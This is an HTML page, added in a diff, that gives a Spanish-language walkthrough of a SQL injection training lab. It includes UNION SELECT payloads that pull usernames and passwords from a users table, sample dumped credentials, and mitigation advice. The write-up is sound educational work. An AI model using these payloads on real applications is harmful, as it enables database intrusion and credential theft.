@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 10 - Retrieving Multiple Values in a Single Column</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 10</h2>
+<p>SQL injection UNION attack, retrieving multiple values in a single column</p>
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+
+<p><strong>Tipo de SQLi:</strong> UNION-based SQL Injection</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Explotar una vulnerabilidad SQL Injection en el filtro de categorías para
+extraer las credenciales de los usuarios desde la tabla <strong>users</strong>.
+</p>
+
+<p>
+El reto consiste en que la consulta original solo devuelve
+<strong>una columna que acepta texto</strong>, por lo que es necesario
+combinar múltiples valores en un solo campo.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad</h3>
+
+<p>
+La aplicación no valida ni sanitiza correctamente el parámetro
+<strong>category</strong>, permitiendo inyectar consultas SQL arbitrarias.
+</p>
+
+<p>
+Esto permite realizar un ataque <strong>UNION SELECT</strong> para recuperar
+información de otras tablas.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1 – Interceptar la petición</strong></p>
+
+<p>
+Se filtran productos desde la página para capturar la solicitud
+GET con el parámetro <strong>category</strong> en Burp Suite.
+</p>
+
+
+<p><strong>Paso 2 – Confirmar número de columnas</strong></p>
+
+<pre>
+'+UNION+SELECT+NULL,'abc'--
+</pre>
+
+<p>
+La respuesta muestra el texto <strong>abc</strong>, confirmando que la
+segunda columna acepta datos de tipo texto.
+</p>
+
+
+<p><strong>Paso 3 – Identificar la tabla de usuarios</strong></p>
+
+<p>
+Se identifica que la tabla vulnerable es:
+</p>
+
+<pre>
+users
+</pre>
+
+
+<p><strong>Paso 4 – Concatenar valores</strong></p>
+
+<p>
+Debido a que solo una columna acepta texto,
+se concatenan username y password en una sola columna:
+</p>
+
+<pre>
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+</pre>
+
+<p>
+El operador <strong>||</strong> concatena los valores
+y el carácter <strong>~</strong> sirve como separador.
+</p>
+
+
+<p>
+La página muestra resultados como:
+</p>
+
+<pre>
+administrator~password123
+user1~pass123
+</pre>
+
+<p>
+Con esto se obtienen las credenciales de administrador.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Uso de consultas parametrizadas.</li>
+
+<li>Validación estricta de entradas.</li>
+
+<li>Principio de mínimo privilegio en la base de datos.</li>
+
+<li>Uso de WAF para detectar patrones de SQLi.</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+</div>
+
+</section>
+
+</body>
+</html>
